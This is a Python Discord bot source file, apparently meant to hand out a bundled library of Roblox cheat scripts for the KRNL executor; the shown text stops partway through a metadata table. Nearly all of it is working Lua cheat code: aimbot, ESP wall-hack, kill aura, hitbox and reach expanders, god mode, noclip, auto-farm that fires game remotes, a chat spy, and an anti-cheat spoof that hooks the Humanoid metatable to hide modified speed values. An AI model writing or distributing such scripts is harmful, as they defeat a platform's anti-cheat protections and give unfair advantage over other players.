# language: Python 3.10+, file: main.py, target: discord.py v2
# multi-server control bot — home-guild-locked, owner-only

import discord
from discord.ext import commands
import aiohttp
import asyncio
import io
import re
import json
import html
import random
import urllib.request
import urllib.parse
import os
import secrets
import shutil
from datetime import datetime, timedelta, timezone
from dotenv import load_dotenv

load_dotenv()

TOKEN         = os.getenv("DISCORD_TOKEN")
OWNER_ID      = int(os.getenv("OWNER_ID"))
HOME_GUILD_ID = int(os.getenv("HOME_GUILD_ID"))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, owner_id=OWNER_ID)

control_snapshots: dict[int, dict[int, list[int]]] = {}
subscriptions: dict[int, dict] = {}
pending_tokens: dict[str, dict] = {}

DISCORD_FILE_LIMIT = 24 * 1024 * 1024
BAD_THUMB = re.compile(r'(\/xx\/|_recording|\/track\/|1x1|placeholder)', re.I)
YT_DLP = shutil.which("yt-dlp") or "yt-dlp"

ROBLOX_SCRIPTS = {

"fly": '''-- Fly Script | KRNL | Universal
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local hrp = character:WaitForChild("HumanoidRootPart")
local flying = false
local speed = 50
local bodyVel = Instance.new("BodyVelocity")
local bodyGyro = Instance.new("BodyGyro")
bodyVel.MaxForce = Vector3.new(1e9,1e9,1e9)
bodyVel.Velocity = Vector3.new(0,0,0)
bodyGyro.MaxTorque = Vector3.new(1e9,1e9,1e9)
bodyGyro.P = 1e4
local function toggleFly()
    flying = not flying
    if flying then
        humanoid.PlatformStand = true
        bodyVel.Parent = hrp
        bodyGyro.Parent = hrp
    else
        humanoid.PlatformStand = false
        bodyVel.Parent = nil
        bodyGyro.Parent = nil
    end
end
local camera = workspace.CurrentCamera
game:GetService("RunService").RenderStepped:Connect(function()
    if flying then
        local cf = camera.CFrame
        local dir = Vector3.new(0,0,0)
        local uis = game:GetService("UserInputService")
        if uis:IsKeyDown(Enum.KeyCode.W) then dir = dir + cf.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.S) then dir = dir - cf.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.A) then dir = dir - cf.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.D) then dir = dir + cf.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0,1,0) end
        if uis:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0,1,0) end
        bodyVel.Velocity = dir.Magnitude > 0 and dir.Unit * speed or Vector3.new(0,0,0)
        bodyGyro.CFrame = cf
    end
end)
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F then toggleFly() end
end)
print("[SLEATH] Fly — F to toggle")
''',

"esp": '''-- ESP | KRNL | Universal
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera
local localPlayer = players.LocalPlayer
local espObjects = {}
local function createESP(player)
    local bg = Instance.new("BillboardGui")
    bg.Size = UDim2.new(0,100,0,50)
    bg.StudsOffset = Vector3.new(0,3,0)
    bg.AlwaysOnTop = true
    bg.Name = "SLEATH_ESP"
    local nl = Instance.new("TextLabel", bg)
    nl.Size = UDim2.new(1,0,0.5,0)
    nl.BackgroundTransparency = 1
    nl.TextColor3 = Color3.fromRGB(255,60,60)
    nl.TextStrokeTransparency = 0
    nl.Font = Enum.Font.GothamBold
    nl.TextScaled = true
    nl.Text = player.Name
    local dl = Instance.new("TextLabel", bg)
    dl.Size = UDim2.new(1,0,0.5,0)
    dl.Position = UDim2.new(0,0,0.5,0)
    dl.BackgroundTransparency = 1
    dl.TextColor3 = Color3.fromRGB(255,255,255)
    dl.TextStrokeTransparency = 0
    dl.Font = Enum.Font.Gotham
    dl.TextScaled = true
    dl.Name = "DistLabel"
    espObjects[player] = bg
    return bg
end
players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function(char)
        wait(0.5)
        if espObjects[p] then espObjects[p]:Destroy() end
        local hrp = char:WaitForChild("HumanoidRootPart",5)
        if hrp then local g = createESP(p); g.Adornee = hrp end
    end)
end)
players.PlayerRemoving:Connect(function(p)
    if espObjects[p] then espObjects[p]:Destroy(); espObjects[p] = nil end
end)
for _,p in ipairs(players:GetPlayers()) do
    if p ~= localPlayer then
        local char = p.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then local g = createESP(p); g.Adornee = hrp end
        end
    end
end
runService.RenderStepped:Connect(function()
    local lhrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    for p, gui in pairs(espObjects) do
        if gui and gui.Adornee and lhrp then
            local dist = math.floor((gui.Adornee.Position - lhrp.Position).Magnitude)
            local dl = gui:FindFirstChild("DistLabel")
            if dl then dl.Text = dist.." studs" end
        end
    end
end)
print("[SLEATH] ESP loaded")
''',

"speed": '''-- Speed Hack | KRNL | Universal
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local DEFAULT_SPEED = 16
local FAST_SPEED = 100
local boosting = false
player.CharacterAdded:Connect(function(char)
    character = char
    humanoid = char:WaitForChild("Humanoid")
    if boosting then humanoid.WalkSpeed = FAST_SPEED end
end)
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.G then
        boosting = not boosting
        humanoid.WalkSpeed = boosting and FAST_SPEED or DEFAULT_SPEED
    end
    if input.KeyCode == Enum.KeyCode.LeftShift and boosting then
        humanoid.WalkSpeed = FAST_SPEED * 2
    end
end)
game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftShift and boosting then
        humanoid.WalkSpeed = FAST_SPEED
    end
end)
print("[SLEATH] Speed — G to toggle")
''',

"infjump": '''-- Infinite Jump | KRNL | Universal
local uis = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local enabled = true
uis.JumpRequest:Connect(function()
    if not enabled then return end
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum and hum:GetState() ~= Enum.HumanoidStateType.Dead then
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)
uis.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.H then
        enabled = not enabled
        print("[SLEATH] Inf jump: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] Infinite jump — H to toggle")
''',

"aimbot": '''-- Silent Aimbot | KRNL | Drawing API
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local camera = workspace.CurrentCamera
local localPlayer = players.LocalPlayer
local ENABLED = false
local FOV = 200
local SMOOTHING = 0.3
local fovCircle = Drawing.new("Circle")
fovCircle.Thickness = 1
fovCircle.Color = Color3.fromRGB(255,255,255)
fovCircle.Filled = false
fovCircle.Radius = FOV
fovCircle.Visible = false
fovCircle.Position = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
local function getNearestTarget()
    local center = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
    local closest, closestDist = nil, math.huge
    for _,p in ipairs(players:GetPlayers()) do
        if p == localPlayer then continue end
        local char = p.Character
        if not char then continue end
        local head = char:FindFirstChild("Head")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not head or not hum or hum.Health <= 0 then continue end
        local sp, onScreen = camera:WorldToViewportPoint(head.Position)
        if not onScreen then continue end
        local dist = (Vector2.new(sp.X, sp.Y) - center).Magnitude
        if dist < closestDist and dist < FOV then closest = head; closestDist = dist end
    end
    return closest
end
runService.RenderStepped:Connect(function()
    fovCircle.Position = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
    fovCircle.Visible = ENABLED
    if not ENABLED then return end
    local target = getNearestTarget()
    if not target then return end
    camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.Position, target.Position), SMOOTHING)
end)
uis.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.J then
        ENABLED = not ENABLED
        print("[SLEATH] Aimbot: "..(ENABLED and "ON" or "OFF"))
    end
    if input.KeyCode == Enum.KeyCode.U then
        FOV = FOV == 200 and 400 or 200
        fovCircle.Radius = FOV
    end
end)
print("[SLEATH] Aimbot — J toggle, U cycle FOV")
''',

"noclip": '''-- NoClip | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local connection
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.N then
        enabled = not enabled
        print("[SLEATH] NoClip: "..(enabled and "ON" or "OFF"))
        if enabled then
            connection = game:GetService("RunService").Stepped:Connect(function()
                local char = player.Character
                if not char then return end
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end)
        else
            if connection then connection:Disconnect(); connection = nil end
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CanCollide = true end
            end
        end
    end
end)
print("[SLEATH] NoClip — N to toggle")
''',

"teleport": '''-- Teleport to Player | KRNL | Universal
local player = game.Players.LocalPlayer
local function teleportToPlayer(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if not target then print("[SLEATH] Not found: "..targetName); return end
    local targetChar = target.Character
    local myChar = player.Character
    if not targetChar or not myChar then return end
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
    if not targetHRP or not myHRP then return end
    myHRP.CFrame = targetHRP.CFrame + Vector3.new(0,3,0)
    print("[SLEATH] Teleported to "..targetName)
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.K then
        local myChar = player.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end
        local closest, closestDist = nil, math.huge
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p == player then continue end
            local char = p.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end
            local dist = (hrp.Position - myHRP.Position).Magnitude
            if dist < closestDist then closest = p; closestDist = dist end
        end
        if closest then teleportToPlayer(closest.Name) end
    end
end)
print("[SLEATH] Teleport — K to nearest player")
''',

"bringplayer": '''-- Bring Player | KRNL | Universal
local player = game.Players.LocalPlayer
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.B then
        local myChar = player.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end
        local closest, closestDist = nil, math.huge
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p == player then continue end
            local char = p.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end
            local dist = (hrp.Position - myHRP.Position).Magnitude
            if dist < closestDist then closest = p; closestDist = dist end
        end
        if closest and closest.Character then
            local hrp = closest.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.CFrame = myHRP.CFrame + Vector3.new(2,0,0) end
        end
    end
end)
print("[SLEATH] Bring Player — B to pull nearest")
''',

"godmode": '''-- God Mode | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local function applyGod(char)
    local hum = char:WaitForChild("Humanoid")
    hum.HealthChanged:Connect(function(newHealth)
        if enabled and newHealth < hum.MaxHealth then hum.Health = hum.MaxHealth end
    end)
end
player.CharacterAdded:Connect(applyGod)
if player.Character then applyGod(player.Character) end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.P then
        enabled = not enabled
        if enabled and player.Character then
            local hum = player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = hum.MaxHealth end
        end
        print("[SLEATH] God mode: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] God mode — P to toggle")
''',

"fullbright": '''-- Fullbright | KRNL | Universal
local lighting = game:GetService("Lighting")
local enabled = false
local original = {}
local function saveOriginal()
    original.Brightness = lighting.Brightness
    original.ClockTime = lighting.ClockTime
    original.FogEnd = lighting.FogEnd
    original.GlobalShadows = lighting.GlobalShadows
    original.Ambient = lighting.Ambient
    original.OutdoorAmbient = lighting.OutdoorAmbient
end
local function applyFullbright()
    lighting.Brightness = 2
    lighting.ClockTime = 14
    lighting.FogEnd = 100000
    lighting.GlobalShadows = false
    lighting.Ambient = Color3.fromRGB(255,255,255)
    lighting.OutdoorAmbient = Color3.fromRGB(255,255,255)
    for _, effect in ipairs(lighting:GetChildren()) do
        if effect:IsA("PostEffect") or effect:IsA("Sky") then effect.Enabled = false end
    end
end
local function restoreOriginal()
    lighting.Brightness = original.Brightness
    lighting.ClockTime = original.ClockTime
    lighting.FogEnd = original.FogEnd
    lighting.GlobalShadows = original.GlobalShadows
    lighting.Ambient = original.Ambient
    lighting.OutdoorAmbient = original.OutdoorAmbient
    for _, effect in ipairs(lighting:GetChildren()) do
        if effect:IsA("PostEffect") or effect:IsA("Sky") then effect.Enabled = true end
    end
end
saveOriginal()
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.L then
        enabled = not enabled
        if enabled then applyFullbright() else restoreOriginal() end
        print("[SLEATH] Fullbright: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] Fullbright — L to toggle")
''',

"antivoid": '''-- Anti-Void | KRNL | Universal
local player = game.Players.LocalPlayer
local lastSafePos = nil
local VOID_THRESHOLD = -100
game:GetService("RunService").Heartbeat:Connect(function()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if hrp.Position.Y > VOID_THRESHOLD then
        lastSafePos = hrp.CFrame
    else
        if lastSafePos then hrp.CFrame = lastSafePos end
    end
end)
print("[SLEATH] Anti-void active")
''',

"chesthop": '''-- Chest Hop | KRNL | Universal
local player = game.Players.LocalPlayer
local LOOT_KEYWORDS = {"chest","loot","treasure","crate","drop","pickup","coin","gem","item"}
local function isLootObject(obj)
    local name = obj.Name:lower()
    for _, kw in ipairs(LOOT_KEYWORDS) do if name:find(kw) then return true end end
    return false
end
local function collectAll()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local count = 0
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and isLootObject(obj) then
            hrp.CFrame = obj.CFrame + Vector3.new(0,3,0)
            local prompt = obj:FindFirstChildOfClass("ProximityPrompt") or obj.Parent:FindFirstChildOfClass("ProximityPrompt")
            if prompt then fireproximityprompt(prompt) end
            count = count + 1
            wait(0.15)
        end
    end
    print("[SLEATH] Collected "..count.." objects")
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.C then collectAll() end
end)
print("[SLEATH] Chest hop — C to collect")
''',

"autoclick": '''-- Auto Clicker | KRNL | Universal
local uis = game:GetService("UserInputService")
local enabled = false
local CLICK_DELAY = 0.05
local function autoClick()
    while enabled do
        local mouse = game.Players.LocalPlayer:GetMouse()
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(mouse.X, mouse.Y, 0, true, game, 0)
        wait(CLICK_DELAY/2)
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(mouse.X, mouse.Y, 0, false, game, 0)
        wait(CLICK_DELAY/2)
    end
end
uis.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.X then
        enabled = not enabled
        print("[SLEATH] Auto clicker: "..(enabled and "ON" or "OFF"))
        if enabled then coroutine.wrap(autoClick)() end
    end
end)
print("[SLEATH] Auto clicker — X to toggle")
''',

"playerlist": '''-- Player List | KRNL | Universal
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local function printPlayerList()
    print("===== SLEATH PLAYER LIST =====")
    for _, player in ipairs(players:GetPlayers()) do
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local pos = hrp and math.floor(hrp.Position.X)..","..math.floor(hrp.Position.Y)..","..math.floor(hrp.Position.Z) or "unknown"
        local health = hum and math.floor(hum.Health).."/"..math.floor(hum.MaxHealth) or "N/A"
        local dist = "N/A"
        if hrp and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            dist = tostring(math.floor((hrp.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude))
        end
        print(string.format("[%s] ID:%d | HP:%s | Dist:%s | Pos:(%s)", player.Name, player.UserId, health, dist, pos))
    end
    print("================================")
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Tab then printPlayerList() end
end)
printPlayerList()
print("[SLEATH] Player list — Tab to refresh")
''',

"spinhack": '''-- Spin Hack | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local connection
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Z then
        enabled = not enabled
        if enabled then
            connection = game:GetService("RunService").RenderStepped:Connect(function()
                local char = player.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(30), 0) end
            end)
        else
            if connection then connection:Disconnect(); connection = nil end
        end
        print("[SLEATH] Spin: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] Spin — Z to toggle")
''',

"antigravity": '''-- Low Gravity | KRNL | Universal
local enabled = false
local DEFAULT_GRAVITY = workspace.Gravity
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.M then
        enabled = not enabled
        workspace.Gravity = enabled and 20 or DEFAULT_GRAVITY
        print("[SLEATH] Low gravity: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] Low gravity — M to toggle")
''',

"reachextend": '''-- Reach Extender | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local REACH = 30
local function extendReach(char)
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") then
            local handle = tool:FindFirstChild("Handle")
            if handle then handle.Size = enabled and Vector3.new(REACH,1,1) or Vector3.new(1,1,1) end
        end
    end
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.R then
        enabled = not enabled
        local char = player.Character
        if char then extendReach(char) end
        print("[SLEATH] Reach: "..(enabled and "ON" or "OFF"))
    end
end)
player.CharacterAdded:Connect(function(char)
    char.ChildAdded:Connect(function(child)
        if child:IsA("Tool") and enabled then extendReach(char) end
    end)
end)
print("[SLEATH] Reach extender — R to toggle")
''',

"killaura": '''-- Kill Aura | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local RANGE = 15
local function killAura()
    while enabled do
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p == player then continue end
                local tc = p.Character
                local thrp = tc and tc:FindFirstChild("HumanoidRootPart")
                local thum = tc and tc:FindFirstChildOfClass("Humanoid")
                if thrp and thum and thum.Health > 0 then
                    if (thrp.Position - hrp.Position).Magnitude <= RANGE then
                        local orig = hrp.CFrame
                        hrp.CFrame = thrp.CFrame
                        wait(0.05)
                        hrp.CFrame = orig
                    end
                end
            end
        end
        wait(0.1)
    end
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Quote then
        enabled = not enabled
        print("[SLEATH] Kill aura: "..(enabled and "ON" or "OFF"))
        if enabled then coroutine.wrap(killAura)() end
    end
end)
print("[SLEATH] Kill aura — apostrophe to toggle")
''',

"autofarm": '''-- Auto Farm | KRNL | Universal
local player = game.Players.LocalPlayer
local NPC_KEYWORDS = {"enemy","zombie","monster","npc","mob","bandit","boss","creature","alien"}
local enabled = false
local ATTACK_RANGE = 10
local function isEnemy(model)
    local name = model.Name:lower()
    for _, kw in ipairs(NPC_KEYWORDS) do if name:find(kw) then return true end end
    return false
end
local function getNearestEnemy(hrp)
    local closest, closestDist = nil, math.huge
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and isEnemy(obj) then
            local root = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildOfClass("BasePart")
            local hum = obj:FindFirstChildOfClass("Humanoid")
            if root and hum and hum.Health > 0 then
                local dist = (root.Position - hrp.Position).Magnitude
                if dist < closestDist then closest = root; closestDist = dist end
            end
        end
    end
    return closest, closestDist
end
local function farm()
    while enabled do
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hrp and hum then
            local target, dist = getNearestEnemy(hrp)
            if target then
                if dist > ATTACK_RANGE then
                    hum:MoveTo(target.Position)
                else
                    for _, tool in ipairs(char:GetChildren()) do
                        if tool:IsA("Tool") then
                            for _, r in ipairs(tool:GetDescendants()) do
                                if r:IsA("RemoteEvent") then pcall(function() r:FireServer() end) end
                            end
                        end
                    end
                end
            end
        end
        wait(0.2)
    end
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.O then
        enabled = not enabled
        print("[SLEATH] Auto farm: "..(enabled and "ON" or "OFF"))
        if enabled then coroutine.wrap(farm)() end
    end
end)
print("[SLEATH] Auto farm — O to toggle")
''',

"camlock": '''-- Camera Lock | KRNL | Universal
local player = game.Players.LocalPlayer
local camera = workspace.CurrentCamera
local runService = game:GetService("RunService")
local enabled = false
local function getNearest()
    local myChar = player.Character
    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myHRP then return nil end
    local closest, closestDist = nil, math.huge
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p == player then continue end
        local char = p.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hrp and hum and hum.Health > 0 then
            local dist = (hrp.Position - myHRP.Position).Magnitude
            if dist < closestDist then closest = hrp; closestDist = dist end
        end
    end
    return closest
end
runService.RenderStepped:Connect(function()
    if not enabled then return end
    local target = getNearest()
    if not target then return end
    camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position)
end)
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Q then
        enabled = not enabled
        print("[SLEATH] Cam lock: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] Camera lock — Q to toggle")
''',

"chatspy": '''-- Chat Spy | KRNL | Universal
local players = game:GetService("Players")
players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg)
        print(string.format("[SLEATH CHAT] [%s] %s: %s", os.date("%H:%M:%S"), p.Name, msg))
    end)
end)
for _, p in ipairs(players:GetPlayers()) do
    p.Chatted:Connect(function(msg)
        print(string.format("[SLEATH CHAT] [%s] %s: %s", os.date("%H:%M:%S"), p.Name, msg))
    end)
end
print("[SLEATH] Chat spy active")
''',

"wallhop": '''-- Bhop | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local connection
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.V then
        enabled = not enabled
        if enabled then
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                local char = player.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum and hum:GetState() == Enum.HumanoidStateType.Landed then
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end)
        else
            if connection then connection:Disconnect(); connection = nil end
        end
        print("[SLEATH] Bhop: "..(enabled and "ON" or "OFF"))
    end
end)
print("[SLEATH] Bhop — V to toggle")
''',

"hitbox": '''-- Hitbox Expander | KRNL | Universal
local players = game.Players
local SIZE = Vector3.new(8,8,8)
local enabled = false
local origSizes = {}
local function expandHitboxes()
    for _, p in ipairs(players:GetPlayers()) do
        if p == players.LocalPlayer then continue end
        local char = p.Character
        if not char then continue end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then origSizes[p.Name] = hrp.Size; hrp.Size = SIZE; hrp.Transparency = 0.9 end
    end
end
local function restoreHitboxes()
    for _, p in ipairs(players:GetPlayers()) do
        local char = p.Character
        if not char then continue end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp and origSizes[p.Name] then hrp.Size = origSizes[p.Name]; hrp.Transparency = 1 end
    end
    origSizes = {}
end
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Semicolon then
        enabled = not enabled
        if enabled then expandHitboxes() else restoreHitboxes() end
        print("[SLEATH] Hitbox: "..(enabled and "ON" or "OFF"))
    end
end)
players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function()
        if enabled then wait(0.5); expandHitboxes() end
    end)
end)
print("[SLEATH] Hitbox expander — semicolon to toggle")
''',

"anticheatbypass": '''-- AC Spoof | KRNL | Universal
local player = game.Players.LocalPlayer
local runService = game:GetService("RunService")
local function spoofHumanoid(char)
    local hum = char:WaitForChild("Humanoid")
    local mt = getrawmetatable(hum)
    if mt then
        local oldIndex = mt.__index
        setreadonly(mt, false)
        mt.__index = function(self, key)
            if key == "WalkSpeed" then return 16 end
            if key == "JumpPower" then return 50 end
            return oldIndex(self, key)
        end
        setreadonly(mt, true)
    end
end
player.CharacterAdded:Connect(spoofHumanoid)
if player.Character then pcall(spoofHumanoid, player.Character) end
runService.Heartbeat:Connect(function()
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BodyMover") then pcall(function() v.Name = "RootAttachment" end) end
    end
end)
print("[SLEATH] AC spoof active")
''',

"customgui": '''-- GUI Hub | KRNL | Universal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SLEATH_HUB"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0,200,0,40)
Frame.Position = UDim2.new(0,10,0.5,-20)
Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(0.8,0,1,0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255,60,60)
Title.Font = Enum.Font.GothamBold
Title.TextScaled = true
Title.Text = "SLEATH"
local ExpandBtn = Instance.new("TextButton", Frame)
ExpandBtn.Size = UDim2.new(0,20,1,0)
ExpandBtn.Position = UDim2.new(1,-20,0,0)
ExpandBtn.BackgroundColor3 = Color3.fromRGB(255,60,60)
ExpandBtn.TextColor3 = Color3.fromRGB(255,255,255)
ExpandBtn.Font = Enum.Font.GothamBold
ExpandBtn.Text = "+"
ExpandBtn.TextScaled = true
ExpandBtn.BorderSizePixel = 0
local expanded = false
local buttonList = {}
local TOGGLES = {
    "F  Fly","G  Speed","H  Inf Jump","J  Aimbot",
    "N  NoClip","P  God Mode","L  Fullbright","M  Low Gravity",
    "V  Bhop","Z  Spin","R  Reach","B  Bring","K  Teleport",
    "O  Auto Farm","Q  Cam Lock","X  Auto Click","C  Chest Hop",
}
local function buildButtons()
    for i, label in ipairs(TOGGLES) do
        local btn = Instance.new("TextLabel", Frame)
        btn.Size = UDim2.new(1,-20,0,24)
        btn.Position = UDim2.new(0,0,0,40+(i-1)*25)
        btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
        btn.TextColor3 = Color3.fromRGB(200,200,200)
        btn.Font = Enum.Font.Gotham
        btn.TextScaled = true
        btn.Text = label
        btn.BorderSizePixel = 0
        table.insert(buttonList, btn)
    end
    Frame.Size = UDim2.new(0,200,0,40+#TOGGLES*25)
end
local function removeButtons()
    for _, btn in ipairs(buttonList) do btn:Destroy() end
    buttonList = {}
    Frame.Size = UDim2.new(0,200,0,40)
end
ExpandBtn.MouseButton1Click:Connect(function()
    expanded = not expanded
    ExpandBtn.Text = expanded and "-" or "+"
    if expanded then buildButtons() else removeButtons() end
end)
print("[SLEATH] GUI Hub — drag panel, + to expand")
''',

"speedvault": '''-- Speed Vault | KRNL | Universal
local player = game.Players.LocalPlayer
local enabled = false
local VAULT_SPEED = 80
local VAULT_DURATION = 0.3
game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Comma then
        enabled = not enabled
        print("[SLEATH] Speed vault: "..(enabled and "ON" or "OFF"))
    end
    if input.KeyCode == Enum.KeyCode.Space and enabled then
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            local orig = hum.WalkSpeed
            hum.WalkSpeed = VAULT_SPEED
            wait(VAULT_DURATION)
            if hum.WalkSpeed == VAULT_SPEED then hum.WalkSpeed = orig end
        end
    end
end)
print("[SLEATH] Speed vault — comma to enable, Space to vault")
''',

}

ROBLOX_META = {
    "fly":             ("Fly",            "Full 6-axis fly.",                               "F to toggle"),
    "esp":             ("ESP",            "See players through walls with distance.",        "Always on"),
    "speed":           ("Speed Hack",     "100 walkspeed, Shift for 2x.",                  "G to toggle"),
    "infjump":         ("Infinite Jump",  "Jump unlimited times mid-air.",                  "H to toggle"),
    "aimbot":          ("Aimbot",         "Silent aim locks to nearest head in FOV.",        "J to toggle, U for FOV"),
    "noclip":          ("NoClip",         "Walk through all geometry.",                      "N to toggle"),
